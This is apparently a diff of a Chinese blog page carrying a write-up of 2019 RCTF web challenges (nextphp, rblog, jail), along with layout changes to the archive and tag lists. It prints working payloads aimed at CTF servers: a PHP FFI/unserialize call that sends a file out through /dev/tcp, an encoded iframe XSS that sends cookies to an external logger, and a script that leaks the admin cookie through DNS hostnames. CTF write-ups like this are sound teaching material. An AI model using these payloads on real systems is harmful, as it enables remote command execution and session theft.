@@ -272,7 +272,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">1.6k</span>阅读时长: <span class="post-count reading-time">8 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">1.7k</span>阅读时长: <span class="post-count reading-time">8 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -409,8 +409,8 @@ height:50vh;
 <p>请求就有flag了<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nextphp.2019.rctf.rois.io/?a=$a=unserialize('C%3A1%3A%22A%22%3A91%3A%7Ba%3A3%3A%7Bs%3A3%3A%22ret%22%3BN%3Bs%3A4%3A%22func%22%3Bs%3A9%3A%22FFI%3A%3Acdef%22%3Bs%3A3%3A%22arg%22%3Bs%3A28%3A%22int+system%28const+char+%2Acmd%29%3B%22%3B%7D%7D');var_dump($a-&gt;ret-&gt;system('bash -c "cat /flag &gt; /dev/tcp/ip/port"'));</span><br></pre></td></tr></table></figure></p>
 <h3 id="rblog"><a href="#rblog" class="headerlink" title="rblog"></a>rblog</h3><p>这题源码里面有一个api<code>https://rblog.2019.rctf.rois.io/api/v2/posts</code>，修改一下参数<code>/api/v2/aaa</code>发现回显<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    "status": false,</span><br><span class="line">    "message": "'\/aaa' not found.",</span><br><span class="line">    "data": []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>尝试在后面添加标签也不能解析，返回的<code>content-type</code>是<code>json</code>，这个时候想到<code>/api/v2/</code>的v2是表示版本号的，后台有没有v1呢，访问一下<code>/api/v1/posts</code>，发现居然正常回显！！！<br>再尝试一下在后面加标签，这次返回是<code>content-type: text/html</code>了，也就是说可以成功执行xss了<br><img src="/assets/2019rctf/7.png" alt=""><br>贴上题目的提示<br><img src="/assets/2019rctf/8.png" alt=""><br>所以我们可以尝试一下<code>/api/v1/posts?callback=test</code>，这个时候会返回<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test(&#123;...&#125;)</span><br></pre></td></tr></table></figure></p>
-<p>但是如果我们改成<code>&lt;script&gt;</code>标签打过去，<code>/</code>会被转义，fuzz一下，转义的只有斜杠和引号，所以我们可以用<code>iframe</code>执行实体编码打过去来绕过，到了这里还有一个难点，题目说了bot用的是最新版的chrome，如果url中的代码和页面内的代码一致就会拦截，而且这个拦截还严格很多，有没有什么方法可以绕过呢？思考一下，假设传进一个无用的参数，这个参数在回传的时候会被后台转义，因此就会造成代码不同实现绕过，这里可以知道中文字符的存储是unicode编码的，自带斜杠，所以我们只要加上中文字符就行，最后的payload  </p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://rblog.2019.rctf.rois.io/api/v1/%3Ciframe%20srcdoc=哈哈哈哈%26%2360%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2332%3B%26%23115%3B%26%23114%3B%26%2399%3B%26%2361%3B%26%2334%3B%26%23104%3B%26%23116%3B%26%23116%3B%26%23112%3B%26%23115%3B%26%2358%3B%26%2347%3B%26%2347%3B%26%23114%3B%26%2398%3B%26%23108%3B%26%23111%3B%26%23103%3B%26%2346%3B%26%2350%3B%26%2348%3B%26%2349%3B%26%2357%3B%26%2346%3B%26%23114%3B%26%2399%3B%26%23116%3B%26%23102%3B%26%2346%3B%26%23114%3B%26%23111%3B%26%23105%3B%26%23115%3B%26%2346%3B%26%23105%3B%26%23111%3B%26%2347%3B%26%2397%3B%26%23112%3B%26%23105%3B%26%2347%3B%26%23118%3B%26%2349%3B%26%2347%3B%26%23112%3B%26%23111%3B%26%23115%3B%26%23116%3B%26%23115%3B%26%2363%3B%26%2399%3B%26%2397%3B%26%23108%3B%26%23108%3B%26%2398%3B%26%2397%3B%26%2399%3B%26%23107%3B%26%2361%3B%26%23112%3B%26%2397%3B%26%23114%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%2346%3B%26%23108%3B%26%23111%3B%26%2399%3B%26%2397%3B%26%23116%3B%26%23105%3B%26%23111%3B%26%23110%3B%26%2346%3B%26%23104%3B%26%23114%3B%26%23101%3B%26%23102%3B%26%2361%3B%26%2339%3B%26%23104%3B%26%23116%3B%26%23116%3B%26%23112%3B%26%2358%3B%26%2347%3B%26%2347%3B%26%23111%3B%26%23110%3B%26%23115%3B%26%23100%3B%26%23116%3B%26%2398%3B%26%2346%3B%26%2399%3B%26%23101%3B%26%23121%3B%26%23101%3B%26%2346%3B%26%23105%3B%26%23111%3B%26%2347%3B%26%2363%3B%26%2339%3B%26%2337%3B%26%2350%3B%26%2398%3B%26%23100%3B%26%23111%3B%26%2399%3B%26%23117%3B%26%23109%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%2346%3B%26%2399%3B%26%23111%3B%26%23111%3B%26%23107%3B%26%23105%3B%26%23101%3B%26%2359%3B%26%2399%3B%26%23111%3B%26%23110%3B%26%23115%3B%26%23111%3B%26%23108%3B%26%23101%3B%26%2346%3B%26%23108%3B%26%23111%3B%26%23103%3B%26%2334%3B%26%2362%3B%26%2360%3B%26%2347%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2362%3B%3E</span><br></pre></td></tr></table></figure>
+<p>但是如果我们改成<code>&lt;script&gt;</code>标签打过去，<code>/</code>会被转义，fuzz一下，转义的只有斜杠和引号，所以我们可以用<code>iframe</code>执行实体编码打过去来绕过，到了这里还有一个难点，题目说了bot用的是最新版的chrome，如果url中的代码和页面内的代码一致就会拦截，而且这个拦截还严格很多，有没有什么方法可以绕过呢？思考一下，假设传进一个无用的参数，这个参数在回传的时候会被后台转义，因此就会造成代码不同实现绕过，这里可以知道中文字符的存储是unicode编码的，自带斜杠，所以我们只要加上中文字符就行，最后的payload<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://rblog.2019.rctf.rois.io/api/v1/%3Ciframe%20srcdoc%3D%E5%95%8A%26%2360%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2332%3B%26%23115%3B%26%23114%3B%26%2399%3B%26%2361%3B%26%2334%3B%26%23104%3B%26%23116%3B%26%23116%3B%26%23112%3B%26%23115%3B%26%2358%3B%26%2347%3B%26%2347%3B%26%23114%3B%26%2398%3B%26%23108%3B%26%23111%3B%26%23103%3B%26%2346%3B%26%2350%3B%26%2348%3B%26%2349%3B%26%2357%3B%26%2346%3B%26%23114%3B%26%2399%3B%26%23116%3B%26%23102%3B%26%2346%3B%26%23114%3B%26%23111%3B%26%23105%3B%26%23115%3B%26%2346%3B%26%23105%3B%26%23111%3B%26%2347%3B%26%2397%3B%26%23112%3B%26%23105%3B%26%2347%3B%26%23118%3B%26%2349%3B%26%2347%3B%26%23112%3B%26%23111%3B%26%23115%3B%26%23116%3B%26%23115%3B%26%2332%3B%26%2399%3B%26%2397%3B%26%23108%3B%26%23108%3B%26%2398%3B%26%2397%3B%26%2399%3B%26%23107%3B%26%2361%3B%26%23112%3B%26%2397%3B%26%23114%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%2346%3B%26%23108%3B%26%23111%3B%26%2399%3B%26%2397%3B%26%23116%3B%26%23105%3B%26%23111%3B%26%23110%3B%26%2346%3B%26%23104%3B%26%23114%3B%26%23101%3B%26%23102%3B%26%2361%3B%26%2339%3B%26%23104%3B%26%23116%3B%26%23116%3B%26%23112%3B%26%2358%3B%26%2347%3B%26%2347%3B%26%23120%3B%26%23120%3B%26%23120%3B%26%2358%3B%26%23120%3B%26%23120%3B%26%23120%3B%26%2347%3B%26%23120%3B%26%23115%3B%26%23115%3B%26%2363%3B%26%2339%3B%26%2337%3B%26%2350%3B%26%2398%3B%26%23101%3B%26%23115%3B%26%2399%3B%26%2397%3B%26%23112%3B%26%23101%3B%26%2340%3B%26%23100%3B%26%23111%3B%26%2399%3B%26%23117%3B%26%23109%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%2346%3B%26%2399%3B%26%23111%3B%26%23111%3B%26%23107%3B%26%23105%3B%26%23101%3B%26%2341%3B%26%2359%3B%26%2399%3B%26%23111%3B%26%23110%3B%26%23115%3B%26%23111%3B%26%23108%3B%26%23101%3B%26%2346%3B%26%23108%3B%26%23111%3B%26%23103%3B%26%2334%3B%26%2362%3B%26%2360%3B%26%2347%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2362%3B%3E</span><br></pre></td></tr></table></figure></p>
+<p>提交给管理员就可以拿到flag了<br><img src="/assets/2019rctf/9.png" alt=""><br><img src="/assets/2019rctf/10.png" alt=""></p>
 <h3 id="jail"><a href="#jail" class="headerlink" title="jail"></a>jail</h3><p>这个页面登录注册进去看见一个编写留言的框，一个反馈给admin看留言，还有一个文件上传的地方<br>抓个包先看一看有没有什么提示<br><img src="/assets/2019rctf/4.png" alt=""><br>看到有两个hint，<code>flag1_is_in_cookie</code>和<code>meta_refresh_is_banned_in_server</code>，所以应该是要打到admin的cookie，所以应该是xss的利用，我们先继续审计一下源码+fuzz一下字符，看下有没有什么限制<br>在火狐操作了一波，用img标签打过去没有反应，猜测bot应该是chrome的，而且还禁止了跳转<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">window</span>.addEventListenr(<span class="string">"beforeunload"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>)</span>&#123;</span><br><span class="line">    event.returnValue = <span class="string">"Are you sure want to exit?"</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Are you sure want to exit?"</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">document</span>.location)</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>freeze对象以后是没有办法解冻的，只能克隆一个具有相同属性的新对象，通过修改新对象的属性来达到目的<br>看一下location有什么能利用<br><img src="/assets/2019rctf/5.png" alt=""><br>尝试一下换一下属性，发现host和hostname可以修改属性且跳转，最终利用<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; </span><br><span class="line">function stringToHex(str)&#123; </span><br><span class="line">	var val=""; </span><br><span class="line">	for(var i = 0; i &lt; str.length; i++)&#123; </span><br><span class="line">		if(val == "") </span><br><span class="line">			val = str.charCodeAt(i).toString(16); </span><br><span class="line">		else </span><br><span class="line">			val += str.charCodeAt(i).toString(16); </span><br><span class="line">	&#125; </span><br><span class="line">	return val; </span><br><span class="line">&#125; location.hostname=stringToHex(document.cookie).substr(0,500)+".onsdtb.ceye.io"&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
 <p>最后看dns流量就行  </p>
@@ -1284,8 +1284,6 @@ top:50vh;
     
     
     
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
         Total : 49
@@ -1359,12 +1357,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/25</span><a class="archive-post-title" href="/2019/03/25/code-breaking-lumenserial/">code breaking lumenserial</a>
+            <span class="archive-post-date">03/25</span><a class="archive-post-title" href="/2019/03/25/2019-0ctf-wp/">2019 0ctf wp</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/25</span><a class="archive-post-title" href="/2019/03/25/2019-0ctf-wp/">2019 0ctf wp</a>
+            <span class="archive-post-date">03/25</span><a class="archive-post-title" href="/2019/03/25/code-breaking-lumenserial/">code breaking lumenserial</a>
         </li>
     
     
@@ -1414,12 +1412,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/24</span><a class="archive-post-title" href="/2019/02/24/2018百越杯wp/">2018百越杯wp</a>
+            <span class="archive-post-date">02/24</span><a class="archive-post-title" href="/2019/02/24/2019tamuctf/">2019tamuctf</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/24</span><a class="archive-post-title" href="/2019/02/24/2019tamuctf/">2019tamuctf</a>
+            <span class="archive-post-date">02/24</span><a class="archive-post-title" href="/2019/02/24/2018百越杯wp/">2018百越杯wp</a>
         </li>
     
     
@@ -1571,17 +1569,17 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="php_tricks"><span class="iconfont-archer">&#xe606;</span>php_tricks</span>
     
-        <span class="sidebar-tag-name" data-tags="cve"><span class="iconfont-archer">&#xe606;</span>cve</span>
-    
         <span class="sidebar-tag-name" data-tags="javascript"><span class="iconfont-archer">&#xe606;</span>javascript</span>
     
         <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
     
+        <span class="sidebar-tag-name" data-tags="cve"><span class="iconfont-archer">&#xe606;</span>cve</span>
+    
         <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
     
-        <span class="sidebar-tag-name" data-tags="java"><span class="iconfont-archer">&#xe606;</span>java</span>
-    
         <span class="sidebar-tag-name" data-tags="web+re"><span class="iconfont-archer">&#xe606;</span>web+re</span>
+    
+        <span class="sidebar-tag-name" data-tags="java"><span class="iconfont-archer">&#xe606;</span>java</span>
     
         <span class="sidebar-tag-name" data-tags="docker"><span class="iconfont-archer">&#xe606;</span>docker</span>
     
